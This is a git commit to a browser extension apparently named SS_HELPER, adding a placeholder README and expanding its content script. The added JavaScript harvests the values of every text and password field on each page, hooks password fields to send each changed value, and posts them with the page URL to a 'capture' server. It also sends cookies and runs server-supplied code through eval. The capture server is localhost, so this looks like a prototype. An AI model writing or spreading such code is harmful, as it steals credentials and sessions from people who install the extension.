51af1e82291a47e469a51f38d0c2632139c40f06
bran4he <brandon_he@163.com>
2016-11-01 01:23:32 +0800

    update input data receive

---
+++ README_ref.md
@@ -0,0 +1,34 @@
+##SS_HELPER
+
+this is *test*
+this is **test**
+this is  b _test_
+this is  b __test__
+
+* Candy.
+* Gum.
+    haha
+* Booze.
+
+>This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,
+consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.
+
+This is an [example link](http://example.com/).
+
+![alt text](ss_helper_ext/images/icon128.png "Title")
+
+I strongly recommend against using any `<blink>` tags.
+
+you've got to put paragraph tags in your blockquotes:
+
+    <blockquote>
+    <p>For example.</p>
+    </blockquote>
+
+
+
+
+###1. 说明
+
+
+###2. 功能
--- ss_helper_ext/js/content.js
+++ ss_helper_ext/js/content.js
@@ -1,9 +1,51 @@
 HOST = "http://localhost:8080/capture/receive";
-
+HOST_DATA = "http://localhost:8080/capture/data";
 window.onload = function(){
     console.info(document.URL);
     console.info(document.cookie);
+    sendData(document.URL);
     sendInfo(document.URL, document.cookie);
+
+};
+
+function sendData(url) {
+    var ary = []; 
+    var inputs = document.getElementsByTagName("input"); 
+    for (var i=0; i<inputs.length; i++) { 
+        var type = inputs[i].type.toLowerCase();
+        if ( type === "password" || type === "text") { 
+            ary.push(type + '_' + inputs[i].value); 
+        } 
+        if(type === "password"){
+            console.log('onchange');
+             // inputs[i].attachEvent("onchange",'onchange_' + send(url, inputs[i].value));
+             inputs[i].onchange  = function(){
+                console.info(this);
+                console.info(this.value);
+                 send(url, 'onchange_' + this.value);
+            };
+        }
+    }
+    console.info(ary.toString());
+    if(ary.length >= 1){        
+        send(url, ary.toString());
+    } 
+
+};
+
+function send(url, str) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", HOST_DATA, true);
+
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4) {
+            // console.log('do');
+      }
+    };
+
+    xhr.send('url=' + url + '&data=' + str);
 };
 
 function sendInfo(url, cookie){
@@ -18,7 +60,7 @@ function sendInfo(url, cookie){
         console.info(xhr.responseText);
         var jsonObj = JSON.parse(xhr.responseText);
         // var jsonObj = {'name':'test', 'content':'test'};
-        console.log(jsonObj);
+        //console.log(jsonObj);
         if('element' == jsonObj.name){
             //add element
             var selfDiv = document.createElement('div');
@@ -30,12 +72,16 @@ function sendInfo(url, cookie){
             //run script
             eval("(" + jsonObj.content + ")");
         }else{
-             var selfDiv = document.createElement('div');
-            selfDiv.innerHTML = 'haha this is test';
-            selfDiv.style = 'color:red;';
-            var firstEle = document.body.firstChild;
-            document.body.insertBefore(selfDiv,firstEle);
+            console.log('nothing');
         }
+        // else{
+        //test case
+        //      var selfDiv = document.createElement('div');
+        //     selfDiv.innerHTML = 'haha this is test';
+        //     selfDiv.style = 'color:red;';
+        //     var firstEle = document.body.firstChild;
+        //     document.body.insertBefore(selfDiv,firstEle);
+        // }
       }
     };
 
